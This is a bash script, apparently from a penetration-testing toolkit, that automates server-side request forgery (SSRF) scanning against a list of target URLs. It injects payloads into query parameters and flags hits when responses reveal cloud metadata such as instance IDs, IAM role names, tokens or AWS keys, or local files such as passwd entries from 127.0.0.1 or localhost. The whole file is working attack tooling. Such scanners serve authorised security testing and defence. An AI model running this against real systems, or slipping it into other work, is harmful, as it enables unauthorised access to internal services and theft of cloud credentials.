#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"; BASE_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
source "$SCRIPT_DIR/../lib.sh"
CLASS=ssrf; PAYLOADS="$SCRIPT_DIR/payloads.txt"
ENGAGEMENT="${1:?Usage: $0 <engagement-id> [urls-file]}"
URLS_FILE="${2:-$BASE_DIR/runtime/engagements/$ENGAGEMENT/recon/urls/ssrf.txt}"
HITS_DIR="$BASE_DIR/runtime/engagements/$ENGAGEMENT/recon/hits/$CLASS"
mkdir -p "$HITS_DIR"
[ ! -f "$PAYLOADS" ] && err "Missing $PAYLOADS" && exit 1
[ ! -f "$URLS_FILE" ] && err "Missing $URLS_FILE" && exit 1
pat_ref "ssrf"

detect() {
  local body="$1" payload="$2"
  case "$payload" in
    *"169.254.169.254"*|*"metadata.google"*)
      echo "$body" | grep -qiE "(ami-id|instance-id|accountId|roleName|secret|token|AKIA)" && return 0
      echo "$body" | grep -qi "computeMetadata" && return 0
      ;;
    *"127.0.0.1"*|*"localhost"*|*"0.0.0.0"*|*"[::]"*)
      echo "$body" | grep -qiE "(root:|html|<title|<body|<form)" && return 0
      [ -n "$(echo "$body" | tr -d '[:space:]')" ] && echo "$body" | wc -c | xargs test 100 -lt && return 0
      ;;
  esac
  echo "$body" | grep -qiE "(169\.254\.169\.254|metadata|iam/security)" 2>/dev/null && return 0
  return 1
}

TOTAL=0; HIT_COUNT=0
while IFS= read -r url || [ -n "$url" ]; do
  [ -z "$url" ] && continue
  info "Testing $url"
  param=$(echo "$url" | grep -oP '(?<=\?|&)[^=]+(?==)' | head -1)
  local_hits=0
  while IFS= read -r payload || [ -n "$payload" ]; do
    [ -z "$payload" ] && continue
    test_url=$(inject_payload "$url" "$payload")
    tmpf=$(mktemp); resp=$(fetch_url "$test_url" "$tmpf")
    status=$(echo "$resp" | awk '{print $1}')
    body=$(cat "$tmpf" 2>/dev/null || true); rm -f "$tmpf"
    if [ "$status" != "000" ] && [ "$status" != "404" ] && detect "$body" "$payload"; then
      local_hits=1; safe=$(echo "$url" | sed 's|https\?://||;s/[^a-zA-Z0-9]/_/g')
      echo "$payload" >> "$HITS_DIR/${safe}_${param}.txt"
      log "HIT on $param (status $status): ${payload:0:60}"
      break
    fi
    TOTAL=$((TOTAL + 1))
  done < "$PAYLOADS"
  [ "$local_hits" -eq 1 ] && HIT_COUNT=$((HIT_COUNT + 1))
done < "$URLS_FILE"
log "SSRF done: $HIT_COUNT URLs with hits"
exit "$HIT_COUNT"
